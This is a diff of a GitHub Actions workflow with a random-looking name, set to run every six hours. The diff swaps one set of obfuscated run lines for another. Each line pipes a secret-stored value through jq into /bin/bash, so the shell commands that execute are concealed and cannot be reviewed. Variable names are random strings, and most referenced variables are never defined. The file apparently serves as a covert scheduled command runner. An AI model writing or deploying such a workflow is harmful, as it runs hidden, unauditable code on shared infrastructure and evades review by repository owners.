@@ -1,10 +1,10 @@
 name: whoppingsweatsuit
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
-
-jobs:  # 6375
+    - cron: '25 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,14 @@ jobs:  # 6375
       - uses: actions/checkout@v4
       - name: whoppingsweatsuit
         env:
-          kpqe503: ${{ secrets.kpqe503 }}
+          poox4964: ${{ secrets.poox4964 }}
         run: |
-          echo $kpqe503 | jq -r .kunqj7 | /bin/bash
-          echo $kqfy9065 | jq -r .gjo98395 | /bin/bash
-          echo $vhjiu0471 | jq -r .diqm90 | /bin/bash
-          echo $r00245 | jq -r .c82070 | /bin/bash
-          echo $qmkp829 | jq -r .ljc54 | /bin/bash
-          echo $flajh9 | jq -r .yvicj0 | /bin/bash
-          echo $qxfik0 | jq -r .ponjn84110 | /bin/bash
-          echo $vof64206 | jq -r .t023 | /bin/bash
-          echo $d64758 | jq -r .dvz5 | /bin/bash
-          echo $i88 | jq -r .rb323 | /bin/bash
+          echo $poox4964 | jq -r .lxehd537 | /bin/bash
+          echo $osie2951 | jq -r .odsz3240 | /bin/bash
+          echo $id4 | jq -r .wemae4 | /bin/bash
+          echo $il89 | jq -r .hfo65345 | /bin/bash
+          echo $kv3834 | jq -r .co2 | /bin/bash
+          echo $na3 | jq -r .mzfyh4 | /bin/bash
+          echo $d9307 | jq -r .bbqff72269 | /bin/bash
+          echo $cucs1 | jq -r .o53484 | /bin/bash
 
